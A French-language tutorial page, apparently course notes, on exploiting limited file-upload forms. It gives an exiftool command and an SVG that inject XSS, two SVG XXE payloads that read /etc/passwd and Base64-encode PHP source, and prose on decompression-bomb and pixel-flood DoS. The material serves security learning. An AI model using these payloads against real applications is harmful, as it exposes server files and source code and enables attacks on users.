# Limited File Uploads

***

### <mark style="color:blue;">**1. Introduction**</mark>

Le téléversement de fichiers peut représenter une menace sérieuse si une application web ne vérifie pas correctement les fichiers envoyés par l'utilisateur. Même si un formulaire de téléversement restreint certains types de fichiers, il peut toujours être exploité pour exécuter des attaques comme **XSS, XXE, SSRF ou DoS**.

***

### <mark style="color:blue;">**2. Attaques possibles**</mark>

#### **2.1. XSS (Cross-Site Scripting)**

Les fichiers contenant des métadonnées peuvent servir à injecter du JavaScript malveillant dans une application web.

**Exemple avec exiftool :**

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

**Effet :** L'application affichera ce commentaire et exécutera le code JavaScript malveillant.

**Exemple avec un fichier SVG :**

{% code fullWidth="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
{% endcode %}

**Effet :** Le script s'exécutera lors de l'affichage de l'image.

***

#### <mark style="color:blue;">**2.2. XXE (XML External Entity)**</mark>

Permet d'accéder à des fichiers internes du serveur.

**Lecture du fichier /etc/passwd avec un SVG :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**Effet :** Affiche le contenu du fichier /etc/passwd.

**Lecture du code source PHP via Base64 :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**Effet :** Encode le fichier en Base64, facilitant la lecture du code source.

***

#### <mark style="color:blue;">**2.3. DoS (Denial of Service)**</mark>

Attaques visant à surcharger le serveur.

**Bombe de décompression ZIP :**

> Un fichier ZIP contenant une archive infiniment compressée peut saturer le serveur lors de sa décompression.

**Pixel Flood avec un fichier JPG :**

> Modification manuelle des métadonnées pour fausser la taille de l'image (ex: 4 gigapixels), forçant le serveur à allouer une mémoire excessive.

**Téléversement de fichiers volumineux :**

> Si aucune limite de taille n'est imposée, un fichier très lourd peut remplir le disque du serveur et provoquer un crash.

***
